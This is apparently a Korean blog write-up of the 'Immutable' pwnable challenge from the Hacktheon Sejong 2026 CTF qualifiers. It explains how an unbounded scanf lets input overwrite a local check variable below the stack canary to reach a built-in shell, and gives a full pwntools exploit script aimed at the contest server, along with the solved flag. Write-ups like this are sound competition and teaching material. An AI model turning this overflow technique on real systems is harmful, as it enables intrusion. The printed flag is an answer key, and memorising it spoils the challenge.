---
title: "Hacktheon Sejong 2026 Quals Immutable Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals Immutable 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

# Immutable

구조는 단순했다.

1. `scanf("%s", buf)`에서 길이 제한 없이 입력을 받는다.
2. 입력 버퍼는 `[rbp-0x90]`, 비교 변수는 `[rbp-0x10]`에 있다.
3. `0x80` 바이트를 채운 뒤 `0xdeadbeef`를 쓰면 비교 변수만 바뀐다.
4. canary는 `[rbp-0x8]`에 있으므로 건드리지 않는다.
5. 조건문을 통과하면 바이너리 안의 `system("/bin/sh")`가 호출된다.

보호기법은 Full RELRO, Canary, NX, PIE가 모두 켜져 있었다.
return address까지 덮을 필요는 없었다.
canary 앞의 local variable만 바꾸면 된다.

스택 배치는 이렇게 잡힌다.

```text
rbp-0x90 : input buffer
...
rbp-0x10 : check variable
rbp-0x08 : stack canary
```

payload는 바로 정해진다.

```python
payload = b"A" * 0x80 + p32(0xdeadbeef)
```

payload를 보내면 shell이 뜬다.
거기서 플래그를 읽었다.

익스플로잇 코드

```python
#!/usr/bin/env python3
from pwn import *


HOST = args.HOST or "3.37.44.62"
PORT = int(args.PORT or 33201)


def main():
    payload = b"A" * 0x80 + p32(0xDEADBEEF)

    io = remote(HOST, PORT)
    io.recvuntil(b"input: ")
    io.sendline(payload)
    io.sendline(b"cat flag; exit")
    print(io.recvall(timeout=3).decode("latin-1"), end="")


if __name__ == "__main__":
    main()
```

플래그: `hacktheon2026{ed2190f6865ca1e3fea816b296445228064a51ec9492b518f514a60624f43d850738dd60b2c9d0893cb5c30f7d1efeaa575527f0b8534a96aa170356d2f8e2d0f3da4b43880faa71}`
